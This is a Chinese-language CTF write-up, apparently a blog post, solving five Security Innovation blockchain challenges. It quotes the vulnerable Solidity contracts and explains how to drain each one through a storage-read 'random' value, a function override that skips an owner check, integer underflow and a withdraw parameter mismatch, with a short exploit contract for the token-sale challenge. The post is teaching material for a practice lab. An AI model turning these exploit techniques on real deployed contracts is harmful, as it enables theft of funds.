# Innovation 智能合约题目合集（上）

阅读量 **191888**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-02-24 10:00:40

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

* * *

## 前言：

最近找到的一个比较有趣的区块链的challenge合集。

<https://blockchain-ctf.securityinnovation.com/#/dashboard>

题目感觉是比最原来的那几个传统漏洞要难一些。其中加入了一些有趣的tips。

所以尝试来做一下这些题目

非常适合初学者来锻炼一下。

我会给出详细的做题解法以及细节处理，

如果有任何问题欢迎评论留言。

此篇介绍前5道题目

* * *

## Donation

所有题目完成的标志是把钱转回。

而这里面就是withdrawxxxxxx函数可以实现这个功能

并且function 类型为external 可以为外部所调用。

但是他的每一个题目都有一个CtfFramework.sol

此合约限制了能偶调用题目合约的地址。

如果需要使用攻击合约或者其他外部账户地址。

需要提前添加。

![](https://p5.ssl.qhimg.com/t01db95ede2fa0c53ff.png)

也就是这里的ctf_challenge。

此题目合约给了源码

但是有很多库是我们所没有的。

所以我选择了全部集成于一个合约来写。

最后点击withdraw调用函数即可。

* * *

## Lock Box

题目利用now 进行一种随机数的取值。

但是此种随机数在constructor中创建被保存于 storage里面

通过反汇编我们发现此处存于stor1

我们只需要在链上找storage1 赋值处即可。

![](https://p5.ssl.qhimg.com/t01371ae8854d78457d.png)

在Transcation Details 里面即可发现

他的js页面已经内置了 web3.eth调用所以可以选择remix 或者页面内直接输入。

![](https://p1.ssl.qhimg.com/t01e751d8c3737ba92c.png)

输入成功

* * *

## Piggy bank

这道题目比较巧妙。

给出部分源代码.

    
    
    contract PiggyBank is CtfFramework{
    
        using SafeMath for uint256;
    
        uint256 public piggyBalance;
        string public name;
        address public owner;
    
        constructor(address _ctfLauncher, address _player, string _name) public payable
            CtfFramework(_ctfLauncher, _player)
        {
            name=_name;
            owner=msg.sender;
            piggyBalance=piggyBalance.add(msg.value);
        }
    
        function() external payable ctf{
            piggyBalance=piggyBalance.add(msg.value);
        }
    
    
        modifier onlyOwner(){
            require(msg.sender == owner, "Unauthorized: Not Owner");
            _;
        }
    
        function withdraw(uint256 amount) internal{
            piggyBalance = piggyBalance.sub(amount);
            msg.sender.transfer(amount);
        }
    
        function collectFunds(uint256 amount) public onlyOwner ctf{
            require(amount<=piggyBalance, "Insufficient Funds in Contract");
            withdraw(amount);
        }
    
    }
    
    
    contract CharliesPiggyBank is PiggyBank{
    
        uint256 public withdrawlCount;
    
        constructor(address _ctfLauncher, address _player) public payable
            PiggyBank(_ctfLauncher, _player, "Charlie") 
        {
            withdrawlCount = 0;
        }
    
        function collectFunds(uint256 amount) public ctf{
            require(amount<=piggyBalance, "Insufficient Funds in Contract");
            withdrawlCount = withdrawlCount.add(1);
            withdraw(amount);
        }
    
    }
    

这里我们可以看到

在`piggybank`这个合约里面 如果我们想要调用

`withdraw 或者 collectfunds`都是需要 是合约的owner才可以。

但是我们并不是。而我们可以发现 `charliesPiggyBank` 这个合约里面 以同样的命名定义了一个`collectfunds`

所以这里实际是会把`piggybank`的同名函数覆盖掉。

所以我们只需要调用 合约的`collectfunds(0.15eth)`即可。

![](https://p2.ssl.qhimg.com/t014adbe81f7844fac6.png)

## SI Token Sale

代码稍微长一些

    
    
    pragma solidity 0.4.24;
    
    import "../CtfFramework.sol";
    
    // https://github.com/OpenZeppelin/openzeppelin-solidity/blob/v1.8.0/contracts/token/ERC20/StandardToken.sol
    import "../StandardToken.sol";
    
    contract SIToken is StandardToken {
    
        using SafeMath for uint256;
    
        string public name = "SIToken";
        string public symbol = "SIT";
        uint public decimals = 18;
        uint public INITIAL_SUPPLY = 1000 * (10 ** decimals);
    
        constructor() public{
            totalSupply_ = INITIAL_SUPPLY;
            balances[this] = INITIAL_SUPPLY;
        }
    }
    
    contract SITokenSale is SIToken, CtfFramework {
    
        uint256 public feeAmount;
        uint256 public etherCollection;
        address public developer;
    
        constructor(address _ctfLauncher, address _player) public payable
            CtfFramework(_ctfLauncher, _player)
        {
            feeAmount = 10 szabo; 
            developer = msg.sender;
            purchaseTokens(msg.value);
        }
    
        function purchaseTokens(uint256 _value) internal{
            require(_value > 0, "Cannot Purchase Zero Tokens");
            require(_value < balances[this], "Not Enough Tokens Available");
            balances[msg.sender] += _value - feeAmount;
            balances[this] -= _value;
            balances[developer] += feeAmount; 
            etherCollection += msg.value;
        }
    
        function () payable external ctf{
            purchaseTokens(msg.value);
        }
    
        // Allow users to refund their tokens for half price ;-)
        function refundTokens(uint256 _value) external ctf{
            require(_value>0, "Cannot Refund Zero Tokens");
            transfer(this, _value);
            etherCollection -= _value/2;
            msg.sender.transfer(_value/2);
        }
    
        function withdrawEther() external ctf{
            require(msg.sender == developer, "Unauthorized: Not Developer");
            require(balances[this] == 0, "Only Allowed Once Sale is Complete");
            msg.sender.transfer(etherCollection);
        }
    
    }
    

可以发现这里没有使用safemath库，考虑溢出，找溢出点。

可能是`purchaseTokens`这个函数中可以自由操控value。

那么 这里就很明显了 我们通过合约下溢 来操控balance

然后查看collection 我这里是300000000000

那么他每次Transfer 一半

那我们自动×2就行。

给出exp

    
    
    contract exp{
        address target=challenge address;
        constructor() payable{}
        function exp1()public payable{
            target.call.value(1000 wei)();
           SITokenSale A=SITokenSale(target);
            A.refundTokens(600000000000000000);
            selfdestruct(Your own address);
        }
        function()payable{
    
        }
    }
    

## Secure Bank

给出合约源码

    
    
    pragma solidity 0.4.24;
    
    import "../CtfFramework.sol";
    
    contract SimpleBank is CtfFramework{
    
        mapping(address => uint256) public balances;
    
        constructor(address _ctfLauncher, address _player) public payable
            CtfFramework(_ctfLauncher, _player)
        {
            balances[msg.sender] = msg.value;
        }
    
        function deposit(address _user) public payable ctf{
            balances[_user] += msg.value;
        }
    
        function withdraw(address _user, uint256 _value) public ctf{
            require(_value<=balances[_user], "Insufficient Balance");
            balances[_user] -= _value;
            msg.sender.transfer(_value);
        }
    
        function () public payable ctf{
            deposit(msg.sender);
        }
    
    }
    
    contract MembersBank is SimpleBank{
    
        mapping(address => string) public members;
    
        constructor(address _ctfLauncher, address _player) public payable
            SimpleBank(_ctfLauncher, _player)
        {
        }
    
        function register(address _user, string _username) public ctf{
            members[_user] = _username;
        }
    
        modifier isMember(address _user){
            bytes memory username = bytes(members[_user]);
            require(username.length != 0, "Member Must First Register");
            _;
        }
    
        function deposit(address _user) public payable isMember(_user) ctf{
            super.deposit(_user);
        }
    
        function withdraw(address _user, uint256 _value) public isMember(_user) ctf{
            super.withdraw(_user, _value);
        }
    
    }
    
    contract SecureBank is MembersBank{
    
        constructor(address _ctfLauncher, address _player) public payable
            MembersBank(_ctfLauncher, _player)
        {
        }
    
        function deposit(address _user) public payable ctf{
            require(msg.sender == _user, "Unauthorized User");
            require(msg.value < 100 ether, "Exceeding Account Limits");
            require(msg.value >= 1 ether, "Does Not Satisfy Minimum Requirement");
            super.deposit(_user);
        }
    
        function withdraw(address _user, uint8 _value) public ctf{
            require(msg.sender == _user, "Unauthorized User");
            require(_value < 100, "Exceeding Account Limits");
            require(_value >= 1, "Does Not Satisfy Minimum Requirement");
            super.withdraw(_user, _value * 1 ether);
        }
    
        function register(address _user, string _username) public ctf{
            require(bytes(_username).length!=0, "Username Not Enough Characters");
            require(bytes(_username).length<=20, "Username Too Many Characters");
            super.register(_user, _username);
        }
    }
    

这里比较明显的一点是 Secure 和 Members 中的withdraw参数不同

这样两个函数的整个意义就不同了 是完全不同的两个函数。 不过他们都会使用super.withdraw来调用Simple中的withdraw

所以我们这里直接去调用 合约创建者的address 加上我们存入的0.4eth即可。

所以我们找寻一下合约创建者

并且基于他一个register.

![](https://p3.ssl.qhimg.com/t01545f664f22563e15.png)

![](https://p5.ssl.qhimg.com/t018337fad9aa959e86.png)

这样就可以了

![](https://p4.ssl.qhimg.com/t018fa0c9441d2ae3fc.png)

* * *

## 小结：

前五道题目主要以合约的基础知识为主，不需要编写过多的程序。主要是教会我们如何在链上查询关于合约的各种相关信息等。  
接下来的 5道题目是主要考察我们的脚本编写合约交互能力的。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Retr_0** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/231466](/post/id/231466)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [blockchain](/tag/blockchain)
  * [双倍活动](/tag/双倍活动)

 **+1** __0赞

 __收藏

![](https://p0.ssl.qhimg.com/t010457258f753577cd.png) Retr_0

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

